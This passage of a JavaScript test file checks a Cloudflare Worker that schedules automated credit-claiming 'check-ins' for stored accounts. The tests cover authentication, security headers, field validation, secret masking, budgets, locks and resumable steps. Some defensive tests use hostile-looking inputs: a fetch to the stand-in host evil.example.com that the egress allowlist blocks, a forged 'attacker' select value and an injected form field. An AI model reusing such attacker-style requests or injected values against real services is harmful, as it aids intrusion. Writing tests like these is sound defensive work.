import test from "node:test";
import assert from "node:assert/strict";
import worker from "../src/index.js";
import { TOOLS, findTool } from "../src/tools/index.js";
import { maskSecret } from "../src/core/text.js";
import { coerceFields, saveAccount, schedOf } from "../src/core/accounts.js";
import { listUids } from "../src/core/store.js";
import { commitSchedEntries, loadSchedIndex } from "../src/core/accounts.js";
import { ACCOUNT_FRAME, FLAGS_FRAME, TOOL_FRAME, aggregate, runAccountNow, runTick } from "../src/core/runner.js";
import { makeBudget, trackedFetch, trackedKv } from "../src/core/budget.js";
import { listRunLog, readRunLog, scrubSecrets, writeRunLog } from "../src/core/logs.js";
import { logicalDay, cstDate } from "../src/core/time.js";
import * as wbApi from "../src/tools/workbuddy/api.js";
import { idemKey } from "../src/tools/workbuddy/api.js";
import { expiresAtOf, subjectOf } from "../src/core/jwt.js";
import { ICONS, iconImg } from "../src/ui/icons.js";
import { TUTORIALS, renderTutorial } from "../src/ui/tutorials.js";
import { dayOf, isDue } from "../src/core/scheduler.js";
import { nextVersion } from "../src/version.js";

const PASSWORD = "correct-horse-battery";
const SECRET_VALUE = "eyJhbGciOiJIUzI1NiJ9.SUPERSECRETVALUE.doNotLeak";

// ── 夹具工具 ──
//
// 它**不在注册表里**，只在需要它的测试里临时注入（withFixtureTool）。
// 为什么这样而不是像从前那样放一个进注册表：
//   · 注册表是生产事实。放进去的工具会占导航一格、被 cron 每 30 分钟调度一次、
//     往 /runs 写假记录 —— 演示夹具不该产生这些副作用。
//   · 但内核有几条分支只有它能走到：creds 里的 select 与 config 里的 select
//     三家真实工具一个都没有（它们全是 textarea / text / datetime）。
//     把这些分支删掉等于让「加第 N 个工具」少掉契约的一半。
// 所以：夹具不注册，但必须真跑。
const FIXTURE = {
  id: "fix",
  name: "夹具",
  order: 900,
  summary: "架构验证夹具 · 不联网、不领取任何东西",
  config: [
    { key: "portal", label: "接入点", type: "select", required: true, default: "cn", options: [{ value: "cn", label: "国内站" }, { value: "sg", label: "新加坡" }] },
    { key: "timeoutSec", label: "请求超时（秒）", type: "text", default: "15", pattern: "^[1-9][0-9]?$", patternMessage: "超时须为 1–99 的整数" },
  ],
  creds: [
    { key: "session", label: "会话票据", type: "textarea", required: true, secret: true },
    { key: "plan", label: "套餐", type: "select", required: true, options: ["free", "pro", "team"] },
    { key: "seatId", label: "席位号", type: "text", required: true, pattern: "^[0-9A-Z]{4,16}$", patternMessage: "席位号须为 4–16 位大写字母或数字" },
    { key: "code", label: "短验证码", type: "text", secret: true },
  ],
  schedule: { resetHour: 0, notBeforeHour: 8, minIntervalSec: 1800, maxDaily: 10, backoff: [5, 15] },
  hosts: [],
  steps: [
    { id: "claim", label: "领取额度", cost: 4, async run() { return { status: "claimed", message: "领取试用额度 +50", credits: 50 }; } },
    // cost 20 刻意大于「跑完一个账号后的剩余额度」，这样第二轮能观察到断点续跑。
    // 别调回 30：内核允许一步开跑前要连收尾写入的余量一起算（runner 的 TAIL_RESERVE），
    // 30 在默认 45 的轮次里连单账号都做不完，这个夹具就观察不到"两步都做成"了。
    { id: "survey", label: "顺手做份问卷", cost: 20, dependsOn: ["claim"], async run() { return { status: "claimed", message: "问卷已提交 +20", credits: 20 }; } },
  ],
  // 三家真实工具都是 uidOf，夹具也统一用 uidOf（uidField 已删）。
  // 它取 seatId 当标识 —— 与从前 uidField: "seatId" 的效果完全一样，
  // 区别是现在这条路径和其它工具走的是同一段代码，而不是一条独立分支。
  uidOf: (ctx) => String(ctx.values.seatId || "").trim(),
  async validate() { return { status: "ok", message: "会话票据格式有效（夹具不联网，不做真实校验）" }; },
};

// 临时把它塞进注册表，跑完再摘掉。TOOLS 是可变数组、findTool 每次现场查它，
// 所以注入对路由层立即生效 —— 这正是"路由从 URL 反查工具"这条链路的可测性来源。
async function withFixtureTool(fn) {
  TOOLS.push(FIXTURE);
  try { return await fn(); } finally {
    const at = TOOLS.indexOf(FIXTURE);
    if (at >= 0) TOOLS.splice(at, 1);
  }
}

// 需要走 HTTP 路由的测试用它包一层：路由从 URL 里的 tool id 反查注册表，
// 夹具不在注册表就会 404。
//
// 注入必须发生在**测试体内部**，不能在调用 test() 的那一刻就注入：
// 模块求值时几十条 fixtureTest 会依次执行，若那时就 push，注册表里会堆着
// 几十份夹具，首页于是渲染几十张重复卡片（实测 71 次子请求，超出 50 硬顶）。
// 包在 async 测试体里，push 与 pop 严格包住这一条测试的执行期。
const fixtureTest = (name, fn) => test(name, () => withFixtureTool(fn));

// Node 的 Request 不会自动推导 content-length，但 Cloudflare 运行时一定会带。
// 网关现在依赖这个头，所以测试必须显式给出，否则测的不是平台真实形态。
function fakeKv({ pageSize = 1000, hardCap = Infinity } = {}) {
  const store = new Map();
  const metas = new Map();
  const expiry = new Map();
  const calls = [];
  // 键名轨迹：calls 只记操作类型（"get"/"put"…），断言"某个工具的键一个都没被碰过"
  // 时需要知道碰的是哪些键。两条轨迹并存，避免改动 calls 的形状把既有断言弄坏。
  const keys = [];
  // 虚拟时钟：测试里的"第二轮"是 31 分钟之后，真实毫秒只过了几个。
  // 不跟着走的话 90 秒的锁永远不会过期，测出来的行为和线上相反。
  let clockMs = Date.now();
  // 模拟平台硬顶：超过就抛，复现"第 51 次子请求把整轮炸掉"的真实故障形态
  const hit = (op) => {
    calls.push(op);
    if (calls.length > hardCap) throw new Error(`Too many subrequests (>${hardCap})`);
  };
  return {
    store, calls, metas, keys,
    get count() { return calls.length; },
    // 从某个位置起，动过所有带 prefix 的键。用来看"某一轮里某个工具的键被碰了几次"。
    countKeys(prefix, since = 0) { return keys.slice(since).filter((k) => String(k).startsWith(prefix)).length; },
    mark() { return keys.length; },
    advanceTo(ms) { clockMs = ms; },
    alive(key) {
      const at = expiry.get(key);
      if (at !== undefined && at <= clockMs) { expiry.delete(key); store.delete(key); metas.delete(key); return false; }
      return true;
    },
    async get(key) { hit("get"); keys.push(key); if (!this.alive(key)) return null; return store.has(key) ? store.get(key) : null; },
    async put(key, value, options) {
      hit("put");
      keys.push(key);
      store.set(key, String(value));
      // metadata 必须照存：日志列表页整页靠它渲染，shim 丢掉它的话
      // "摘要进 metadata ⇒ 列表零 get"这条设计必须由本测试真的走一遍，否则等于没跑
      if (options && options.metadata !== undefined) metas.set(key, options.metadata); else metas.delete(key);
      const ttl = options && Number.isFinite(options.expirationTtl) ? options.expirationTtl : null;
      if (ttl) expiry.set(key, clockMs + ttl * 1000); else expiry.delete(key);
    },
    async delete(key) { hit("delete"); keys.push(key); store.delete(key); metas.delete(key); expiry.delete(key); },
    async list({ prefix, cursor, limit }) {
      hit("list");
      keys.push(`list:${prefix}`);
      const all = [...store.keys()].filter((k) => k.startsWith(prefix) && this.alive(k)).sort().map((name) => ({ name, metadata: metas.get(name) }));
      const from = cursor ? Number(cursor) : 0;
      // 真实 KV 的 limit 是"这一页最多回多少键"（上限 1000），分页游标按 pageSize 走
      const width = Math.min(pageSize, Number.isFinite(limit) ? Math.max(1, limit) : pageSize);
      const slice = all.slice(from, from + width);
      const next = from + width;
      return { keys: slice, list_complete: next >= all.length, cursor: next >= all.length ? null : String(next) };
    },
  };
}

const envFor = (kv) => ({ PASSWORD, CHECKIN_KV: kv });

async function hit(path, { method = "GET", body, env, headers = {}, omitLength = false } = {}) {
  const finalHeaders = { ...headers };
  if (typeof body === "string") {
    if (!finalHeaders["content-type"]) finalHeaders["content-type"] = "application/x-www-form-urlencoded";
    if (!omitLength && !finalHeaders["content-length"]) {
      finalHeaders["content-length"] = String(new TextEncoder().encode(body).length);
    }
  }
  const url = path.startsWith("http") ? path : `https://checkin.test${path}`;
  const response = await worker.fetch(new Request(url, { method, body, headers: finalHeaders }), env);
  return { status: response.status, headers: response.headers, text: await response.text() };
}

const form = (fields) => new URLSearchParams(fields).toString();
const authed = (path, env) => hit(`${path}${path.includes("?") ? "&" : "?"}pwd=${PASSWORD}`, { env });

async function createAccount(env, kv, seatId = "ABCD1234", label = "甲") {
  return hit("/account/fix/new", {
    method: "POST", env,
    body: form({ pwd: PASSWORD, label, session: SECRET_VALUE, plan: "pro", seatId }),
  });
}

const NEW_BODY = { pwd: PASSWORD, label: "甲", session: SECRET_VALUE, plan: "pro", seatId: "ABCD1234" };

// ═══════════ 原有 21 条 ═══════════

test("未带口令 → 401，且不泄露任何工具名", async () => {
  const res = await hit("/", { env: envFor(fakeKv()) });
  assert.equal(res.status, 401);
  assert.ok(!res.text.includes("夹具"));
});

test("错口令 → 401，与未带口令不可区分", async () => {
  assert.equal((await hit("/?pwd=wrong-one", { env: envFor(fakeKv()) })).status, 401);
});

test("口令可以走 X-Pwd 请求头", async () => {
  const res = await hit("/", { env: envFor(fakeKv()), headers: { "X-Pwd": PASSWORD } });
  assert.equal(res.status, 200);
});

test("没设 PASSWORD → 500 并明确说缺什么", async () => {
  const res = await authed("/", { CHECKIN_KV: fakeKv() });
  assert.equal(res.status, 500);
  assert.ok(res.text.includes("PASSWORD"));
});

test("安全头齐全，且禁脚本", async () => {
  const res = await authed("/", envFor(fakeKv()));
  assert.equal(res.headers.get("x-frame-options"), "DENY");
  assert.equal(res.headers.get("x-content-type-options"), "nosniff");
  assert.equal(res.headers.get("referrer-policy"), "no-referrer");
  assert.equal(res.headers.get("cache-control"), "no-store");
  assert.match(res.headers.get("content-security-policy"), /default-src 'none'/);
  assert.ok(!/<script[\s>]/.test(res.text));
});

test("缺 KV 绑定要大声失败", async () => {
  const res = await authed("/", { PASSWORD });
  assert.equal(res.status, 500);
  assert.ok(res.text.includes("CHECKIN_KV"));
});

fixtureTest("总览渲染注册表里的工具", async () => {
  const res = await authed("/", envFor(fakeKv()));
  assert.ok(res.text.includes("夹具"));
});

// 工具卡片上原来有两行内部参数：「单账号约需」（子请求数 + 日界 + 开始时间）与
// 「下一次预计执行」。这两项对使用者没有行动价值；而日界/开始时间是内核的调度参数，
// 摆在卡片上只会让人以为改了它就能改执行时间。
fixtureTest("总览卡片不显示子请求数、日界与下一次预计执行", async () => {
  const res = await authed("/", envFor(fakeKv()));
  assert.ok(!res.text.includes("单账号约需"), "卡片上不该出现子请求数与日界");
  assert.ok(!res.text.includes("下一次预计执行"), "卡片上不该出现下一次预计执行");
  assert.ok(!res.text.includes("子请求 ·"), "日界与开始时间不该和子请求数混在一行里");
  // 真正有用的还在：今日完成数与最后结果
  assert.match(res.text, /今日完成/, "删掉参数行后要保留「今日完成」");
  assert.match(res.text, /最后结果/, "删掉参数行后要保留「最后结果」");
});

fixtureTest("工具描述用使用者的话，不写内部接口名", async () => {
  for (const tool of TOOLS) {
    // campaigns / claim / endpoint 这类词对不了解上游的人没有信息量
    assert.doesNotMatch(tool.summary, /campaigns|→|endpoint|接口/i,
      `${tool.name} 的描述里带了内部实现词：${tool.summary}`);
  }
});

fixtureTest("表单由字段 schema 自动生成：select 与 textarea 都在", async () => {
  const res = await authed("/account/new?tool=fix", envFor(fakeKv()));
  assert.match(res.text, /<select[^>]*name="plan"/);
  assert.match(res.text, /<textarea[^>]*name="session"/);
});

test("注册表外的 tool id 一律 404，且不写任何 KV 键", async () => {
  const kv = fakeKv();
  assert.equal((await authed("/account/new?tool=evil", envFor(kv))).status, 404);
  assert.equal(kv.store.size, 0);
});

fixtureTest("格式不合规定的字段被拦下，不落 KV", async () => {
  const kv = fakeKv();
  const res = await createAccount(envFor(kv), kv, "bad id!");
  assert.equal(res.status, 400);
  assert.equal(kv.store.size, 0);
});

fixtureTest("select 的取值受白名单约束", async () => {
  const kv = fakeKv();
  const res = await hit("/account/fix/new", {
    method: "POST", env: envFor(kv),
    body: form({ ...NEW_BODY, plan: "attacker" }),
  });
  assert.equal(res.status, 400);
  assert.equal(kv.store.size, 0);
});

fixtureTest("表单里塞 schema 之外的字段会被丢弃", async () => {
  const kv = fakeKv();
  await hit("/account/fix/new", { method: "POST", env: envFor(kv), body: form({ ...NEW_BODY, injected: "yes" }) });
  const record = JSON.parse(kv.store.get("v1:acct:fix:ABCD1234"));
  assert.equal(record.cred.injected, undefined);
  assert.equal(Object.keys(record.cred).sort().join(","), "plan,seatId,session");
  assert.equal(record.label, "甲");
});

fixtureTest("建账号：303 重定向 + 键名精确 + 跟随跳转能看到", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  const created = await createAccount(env, kv);
  assert.equal(created.status, 303);
  const location = created.headers.get("location");
  assert.ok(location.includes("/tool/fix") && location.includes("done=saved"));
  assert.ok(kv.store.has("v1:acct:fix:ABCD1234"));
  const page = await hit(location, { env });
  assert.ok(page.text.includes("ABCD1234") && page.text.includes("已保存"));
});

test("敏感值在任何页面上都不回显", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  await createAccount(env, kv);
  for (const path of ["/", "/tool/fix", "/account/fix/ABCD1234/edit", "/api/state", "/help"]) {
    const res = await authed(path, env);
    assert.ok(!res.text.includes("SUPERSECRETVALUE"), `${path} 泄露敏感值`);
  }
});

fixtureTest("编辑时敏感字段留空 = 保持原值", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  await createAccount(env, kv);
  const updated = await hit("/account/fix/ABCD1234/edit", {
    method: "POST", env, body: form({ pwd: PASSWORD, label: "改名", session: "", plan: "team", seatId: "ABCD1234" }),
  });
  assert.equal(updated.status, 303);
  const record = JSON.parse(kv.store.get("v1:acct:fix:ABCD1234"));
  assert.equal(record.cred.session, SECRET_VALUE);
  assert.equal(record.cred.plan, "team");
});

fixtureTest("重复 uid 拒绝覆盖", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  await createAccount(env, kv);
  assert.equal((await createAccount(env, kv)).status, 409);
});

fixtureTest("删除账号", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  await createAccount(env, kv);
  const del = await hit("/account/fix/ABCD1234/delete", { method: "POST", env, body: form({ pwd: PASSWORD }) });
  assert.equal(del.status, 303);
  assert.equal(kv.store.has("v1:acct:fix:ABCD1234"), false);
});

fixtureTest("工具配置存 KV、界面可改", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  assert.ok((await authed("/tool/fix/settings", env)).text.includes("工具配置未完成"));
  const saved = await hit("/tool/fix/settings", {
    method: "POST", env, body: form({ pwd: PASSWORD, portal: "sg", timeoutSec: "20" }),
  });
  assert.equal(saved.status, 303);
  assert.deepEqual(JSON.parse(kv.store.get("v1:tool:fix")), { portal: "sg", timeoutSec: "20" });
  assert.ok(!(await authed("/tool/fix/settings", env)).text.includes("工具配置未完成"));
});

fixtureTest("/api/state 输出脱敏后的结构", async () => {
  const data = JSON.parse((await authed("/api/state", envFor(fakeKv()))).text);
  assert.equal(data.ok, true);
  // 与注册表对照，不写死名单：加一家工具不该让这条测试变红（也不该让它假绿）
  assert.deepEqual(data.tools.map((t) => t.id).sort(), TOOLS.map((t) => t.id).sort());
  assert.equal(data.tools.find((t) => t.id === "fix").accounts, 0);
});

test("未知路径 404", async () => {
  assert.equal((await authed("/nope", envFor(fakeKv()))).status, 404);
});

fixtureTest("scheduled 会真的跑一轮并输出结构化汇总", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  seedAccount(kv, "SEAT0001");
  const logs = [];
  const original = console.log;
  console.log = (...args) => logs.push(args.join(" "));
  try {
    // 计划时刻用固定值而非墙钟：夹具有 notBeforeHour=8 的闸，
    // 用 Date.now() 的话，北京时间 8 点前跑这条测试就会被闸挡掉（ran=0）
    await worker.scheduled({ cron: "*/30 * * * *", scheduledTime: cst(12) * 1000 }, env);
  } finally {
    console.log = original;
  }
  const tick = logs.find((l) => l.includes("[checkin] {"));
  assert.ok(tick, "应输出一轮汇总");
  const summary = JSON.parse(tick.replace("[checkin] ", ""));
  assert.equal(summary.trigger, "cron");
  assert.equal(summary.ran, 1);
  assert.equal(planOf(summary).accounts[0].status, "claimed");
});

// ═══════════ 到期队列 · 预算 · 断点续跑 · 逻辑日界 · 退避 ═══════════

// 夹具工具的 portal 是必填工具级配置，不补齐的话调度会正确地跳过整个工具
function seedConfig(kv) {
  if (!kv.store.has("v1:tool:fix")) kv.store.set("v1:tool:fix", JSON.stringify({ portal: "cn", timeoutSec: "15" }));
}
function seedAccount(kv, uid, extra = {}) {
  seedConfig(kv);
  kv.store.set(`v1:acct:fix:${uid}`, JSON.stringify({
    label: uid, cred: { seatId: uid, plan: "pro", session: SECRET_VALUE },
    createdAt: 1, updatedAt: 1, ...extra,
  }));
}

// 调度状态存在每工具的索引键里，不在账号记录里 —— 读状态必须走这里
const IDX = "v1:schedidx:fix";
function seedSched(kv, uid, entry) {
  const idx = kv.store.has(IDX) ? JSON.parse(kv.store.get(IDX)) : { day: null, entries: {} };
  idx.entries[uid] = { ...schedOf(), ...entry };
  kv.store.set(IDX, JSON.stringify(idx));
}
function schedEntry(kv, uid) {
  const idx = kv.store.has(IDX) ? JSON.parse(kv.store.get(IDX)) : { entries: {} };
  return schedOf(idx.entries[uid]);
}
const acct = (kv, uid) => JSON.parse(kv.store.get(`v1:acct:fix:${uid}`));
const progress = (kv, uid) => {
  const raw = kv.store.get(`v1:step:fix:${uid}`);
  return raw ? JSON.parse(raw) : null;
};
// CST 10:00 = UTC 02:00，在 notBeforeHour=8 之后
const DAY = Date.UTC(2026, 8, 30) / 1000;
const cst = (hour, minute = 0) => DAY + hour * 3600 + minute * 60 - 8 * 3600;

// 默认只跑夹具这一家：注册表里有几家工具是运行时的事实，
// 不该让每条断言都依赖"当前恰好只有几个工具、且谁排第一"。
// 要验多工具场景的测试自己传 tools: TOOLS。
function tick(env, { now = cst(10), limit = 45, tools = [FIX] } = {}) {
  const budget = makeBudget(limit);
  return { budget, run: async () => {
    // 让 KV 的虚拟时钟跟着测试的模拟时间走，否则 90 秒的锁永远不会过期
    if (env.CHECKIN_KV.advanceTo) env.CHECKIN_KV.advanceTo(now * 1000);
    const scoped = { ...env, CHECKIN_KV: trackedKv(env.CHECKIN_KV, budget) };
    return runTick({ env: scoped, budget, tools, trigger: "manual", now });
  } };
}
// 按工具 id 取那一摊，不假设 plan 的顺序
// 夹具工具按 id 取，不按注册表位置取：注册表会随加工具而变，位置一变整批测试就集体报错
// 夹具的默认实例：只给不经过 HTTP 路由的测试用（它们自己把 tools 数组传给 runTick，
// 不查注册表）。要走路由的测试必须用 withFixtureTool 把 FIXTURE 注入注册表。
const FIX = FIXTURE;
const planOf = (summary, toolId = "fix") => summary.plan.find((p) => p.tool === toolId) || { accounts: [], skipped: "缺项" };
const firstAccount = (summary) => planOf(summary).accounts[0];

test("未到 notBeforeHour 不排队，过了才跑", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA1");
  const early = await tick(env, { now: cst(7, 30) }).run();
  assert.equal(early.ran, 0, "CST 07:30 不该跑");
  assert.equal(early.plan[0].skipped, "无到期账号");
  const late = await tick(env, { now: cst(9) }).run();
  assert.equal(late.ran, 1, "CST 09:00 该跑");
});

test("跑完即闩锁：同一逻辑日内不再重复排队", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA2");
  assert.equal((await tick(env, {}).run()).ran, 1);
  const again = await tick(env, { now: cst(11) }).run();
  assert.equal(again.ran, 0, "已 claimed 的账号今天不该再跑");
  assert.equal(again.plan[0].skipped, "无到期账号");
});

test("预算装不下的步骤单独顺延，不影响已完成的部分", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA3");
  const summary = await tick(env, { limit: 30 }).run();
  const result = firstAccount(summary);
  assert.equal(result.status, "deferred");
  assert.deepEqual(result.steps.map((s) => s.status), ["claimed", "deferred"]);
  assert.ok(result.steps[1].message.includes("预算不足"), "顺延理由要写清楚");
  assert.equal(kv.store.has("v1:step:fix:SEATA3"), true, "未完成时进度要落盘");
});

test("断点续跑：第二轮跳过已完成步骤，只补剩下的", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA4");
  const round1 = firstAccount(await tick(env, { limit: 30 }).run());
  assert.equal(round1.status, "deferred");

  // 隔过 minIntervalSec，模拟下一轮
  const round2 = firstAccount(await tick(env, { now: cst(10, 31), limit: 45 }).run());
  assert.equal(round2.status, "claimed");
  assert.equal(round2.steps[0].reused, true, "claim 不该重跑");
  assert.equal(round2.steps[1].status, "claimed");
  assert.equal(kv.store.has("v1:step:fix:SEATA4"), false, "全部完成后进度键应被清掉");
});

test("进度只在停止点写一次，不是每步都写", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA5");
  kv.calls.length = 0;
  await tick(env, { limit: 45 }).run();
  const stepWrites = kv.calls.filter((c) => c === "put").length;
  // put 出现在锁、心跳、进度、账号状态上；关键是进度键只被写过一次
  assert.equal(stepWrites >= 1, true);
  const p = progress(kv, "SEATA5");
  assert.equal(p, null, "全部完成时不该留下进度键");
});

test("跨逻辑日：进度重置，账号重新到期", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA6");
  await tick(env, { limit: 30 }).run();
  assert.equal(progress(kv, "SEATA6") !== null, true);
  const nextDay = firstAccount(await tick(env, { now: cst(10) + 86400, limit: 45 }).run());
  assert.equal(nextDay.status, "claimed", "新的一天 claim 应重跑并全部完成");
  assert.equal(nextDay.steps[0].reused, undefined || false, "昨天的进度不该被今天复用");
});

test("minIntervalSec 闸：刚跑过的不重复排队", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA7");
  seedSched(kv, "SEATA7", { lastStatus: "error", lastAt: cst(10), attempts: 1 });
  const summary = await tick(env, { now: cst(10, 10) }).run();
  assert.equal(summary.ran, 0, "间隔未到");
});

test("maxDaily 闸：当日次数用尽就不排", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  const day = logicalDay(0, cst(10));
  seedAccount(kv, "SEATA8");
  seedSched(kv, "SEATA8", { lastStatus: "error", lastStatusDate: day, attempts: 10, attemptsDate: day });
  assert.equal((await tick(env, { now: cst(10, 40) }).run()).ran, 0);
});

test("限频走退避阶梯，且退避期内不排队", async () => {
  // 关掉 minIntervalSec，单独测退避：FIX 的 30 分钟间隔比第 1 档 5 分钟更严，
  // 两个闸叠在一起就看不出退避本身对不对
  const tools = [rateLimitedTool()];
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATA9");
  const now = cst(10);

  const first = firstAccount(await tick(env, { now, tools }).run());
  assert.equal(first.status, "rate_limited", "限频不能被归成 already 或 error");
  const record = schedEntry(kv, "SEATA9");
  assert.equal(record.rateStrikes, 1);
  assert.equal(record.retryAt, now + 5 * 60, "第 1 档 5 分钟");

  assert.equal((await tick(env, { now: now + 60, tools }).run()).ran, 0, "退避期内不该排队");

  const second = firstAccount(await tick(env, { now: now + 6 * 60, tools }).run());
  assert.equal(second.status, "rate_limited");
  assert.equal(schedEntry(kv, "SEATA9").rateStrikes, 2);
  assert.equal(schedEntry(kv, "SEATA9").retryAt, now + 6 * 60 + 15 * 60, "第 2 档 15 分钟");

  // 第三次落到阶梯末端后不再增长
  const third = firstAccount(await tick(env, { now: now + 30 * 60, tools }).run());
  assert.equal(third.status, "rate_limited");
  assert.equal(schedEntry(kv, "SEATA9").rateStrikes, 3);
  assert.equal(schedEntry(kv, "SEATA9").retryAt, now + 30 * 60 + 15 * 60, "超出阶梯长度后停在最后一档");
});

function rateLimitedTool() {
  return {
    ...FIX,
    schedule: { ...FIX.schedule, minIntervalSec: 0 },
    steps: [{ id: "claim", label: "领取额度", cost: 4, async run() { return { status: "rate_limited", message: "操作过于频繁（9074）" }; } }],
  };
}

test("登录失效时后续步骤直接跳过，不白打请求", async () => {
  const tools = [{
    ...FIX,
    steps: [
      { id: "a", label: "甲", cost: 4, async run() { return { status: "login_required", message: "401" }; } },
      { id: "b", label: "乙", cost: 4, async run() { throw new Error("不该被执行"); } },
    ],
  }];
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATB1");
  const result = firstAccount(await tick(env, { tools }).run());
  assert.equal(result.status, "login_required");
  assert.deepEqual(result.steps.map((s) => s.status), ["login_required", "skipped"]);
});

test("已有锁的账号本轮跳过", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATB2");
  kv.store.set("v1:lock:fix:SEATB2", String(cst(10)));
  const result = firstAccount(await tick(env, {}).run());
  assert.equal(result.status, "skipped");
  assert.ok(result.message.includes("在途"));
});

test("锁的 TTL：同轮重复触发跳过，90 秒后自动失效可重跑", async () => {
  // 锁靠 KV 的 expirationTtl 过期，不靠 runner 判断 —— 这个值没人守就会
  // 在一次"顺手调大"里把账号永久卡死，或在"顺手调小"里失去互斥。
  // 用单账号手动执行：它跳过调度闸但仍过锁，测的就是锁本身。
  const kv = fakeKv();
  seedAccount(kv, "LOCKTTL");
  const t0 = cst(10);
  const run = (now) => {
    kv.advanceTo(now * 1000); // 虚拟时钟不推进，90 秒的锁永远不会过期
    return runAccountNow({ env: envFor(kv), budget: makeBudget(45), tool: FIX, uid: "LOCKTTL", trigger: "manual", now });
  };

  // 第一轮：正常执行，留下锁
  const r1 = await run(t0);
  assert.equal(r1.status, "claimed");
  assert.ok(kv.store.has("v1:lock:fix:LOCKTTL"), "第一轮应留下锁");

  // 第二轮：10 秒后，锁还在 → 跳过（互斥生效）
  const r2 = await run(t0 + 10);
  assert.equal(r2.status, "skipped");
  assert.ok(r2.message.includes("在途"));

  // 第三轮：91 秒后，锁已过期 → 正常执行（账号没有被锁卡死）
  const r3 = await run(t0 + 91);
  assert.equal(r3.status, "claimed", "锁过期后应能重跑");
});

test("出口域名白名单：不在名单里的域名直接抛错", async () => {
  const budget = makeBudget(45);
  const fetchTracked = trackedFetch(budget, ["copilot.tencent.com"]);
  await assert.rejects(() => fetchTracked("https://evil.example.com/x"), /禁止的请求域名/);
  assert.equal(budget.used, 0, "被拦下的请求不该记账，它根本没发出去");
});

test("一次调用一本账：预算用量等于真实子请求数", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATB3");
  seedAccount(kv, "SEATB4");
  const budget = makeBudget(45);
  const scoped = { ...env, CHECKIN_KV: trackedKv(kv, budget) };
  kv.calls.length = 0;
  await runTick({ env: scoped, budget, tools: TOOLS, trigger: "manual", now: cst(10) });
  assert.equal(budget.used, kv.calls.length, "账本与 KV 实际调用数必须一致");
  assert.ok(budget.used > 0);
});

test("配置未完成的工具被整体跳过；补齐后同一年号即可执行", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATB5");
  kv.store.delete("v1:tool:fix"); // 必填的 portal 缺失

  const blocked = await tick(env, {}).run();
  assert.equal(blocked.ran, 0);
  assert.equal(blocked.plan[0].skipped, "配置未完成");
  assert.equal(kv.calls.filter((c) => c === "get").length, 2, "跳过时只该读一次配置 + 一次停用标记；多了就是在逐账号读");

  kv.store.set("v1:tool:fix", JSON.stringify({ portal: "cn", timeoutSec: "15" }));
  assert.equal(firstAccount(await tick(env, {}).run()).status, "claimed");
});

test("dependsOn 未满足的步骤不执行", async () => {
  const tools = [{
    ...FIX,
    steps: [
      { id: "a", label: "甲", cost: 4, async run() { return { status: "error", message: "上游炸了" }; } },
      { id: "b", label: "乙", cost: 4, dependsOn: ["a"], async run() { throw new Error("不该被执行"); } },
    ],
  }];
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATC1");
  const result = firstAccount(await tick(env, { tools }).run());
  assert.deepEqual(result.steps.map((s) => s.status), ["error", "skipped"]);
  assert.ok(result.steps[1].message.includes("依赖未满足"));
});

test("真·空转的轮次（一步都没跑成）不刷新 lastAt、不计入当日次数", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATE1");
  const now = cst(10);

  // 预算刚好够付每工具的固定开销、不够付一个账号的固定开销 → 账号在进管线前就被拦掉。
  // 用 TOOL_FRAME 表达而不是写死数字：那笔开销随内核改动，测试不该记魔法数。
  const round1 = firstAccount(await tick(env, { now, limit: TOOL_FRAME + 1 }).run());
  assert.equal(round1.status, "deferred");
  const after = schedOf(schedEntry(kv, "SEATE1"));
  assert.equal(after.attempts, 0, "空转不该烧掉当日次数");
  assert.equal(after.lastAt, 0, "空转不该刷新 lastAt");

  // 过 90 秒锁的 TTL 之后，下一轮直接就能跑完，不需要再等 minIntervalSec
  const round2 = firstAccount(await tick(env, { now: now + 120, limit: 45 }).run());
  assert.equal(round2.status, "claimed");
  assert.equal(schedEntry(kv, "SEATE1").attempts, 1, "真干活的那轮才计数");
});

test("部分完成的轮次计入次数，剩余步骤在下一个 tick 间隔续跑", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATE4");
  const now = cst(10);

  const round1 = firstAccount(await tick(env, { now, limit: 30 }).run());
  assert.equal(round1.status, "deferred");
  assert.equal(round1.steps[0].status, "claimed");
  assert.equal(schedEntry(kv, "SEATE4").attempts, 1, "跑成了一步就算一次");
  assert.equal(schedEntry(kv, "SEATE4").lastAt, now);

  // 生产里 tick 间隔就是 30 分钟，正好等于 minIntervalSec
  const round2 = firstAccount(await tick(env, { now: now + 1800, limit: 45 }).run());
  assert.equal(round2.status, "claimed");
  assert.equal(round2.steps[0].reused, true, "已完成的 claim 不该重跑");
  assert.equal(round2.steps[1].status, "claimed");
});

test("顺延的剩余步骤在下一轮立即接续，不被 minIntervalSec 挡住", async () => {
  // 真实运行时才暴露的问题：claim 跑成 → lastAt 被刷新 → 30 分钟间隔闸把整个账号挡住，
  // 于是 survey 永远接不上。minIntervalSec 是防"反复重试失败账号"的，不该防"接着做没做完的活"。
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATR1");
  const now = cst(10);

  const round1 = firstAccount(await tick(env, { now, limit: 30 }).run());
  assert.equal(round1.status, "deferred");
  assert.equal(schedOf(schedEntry(kv, "SEATR1")).resumable, true, "有剩余步骤就该标记可接续");

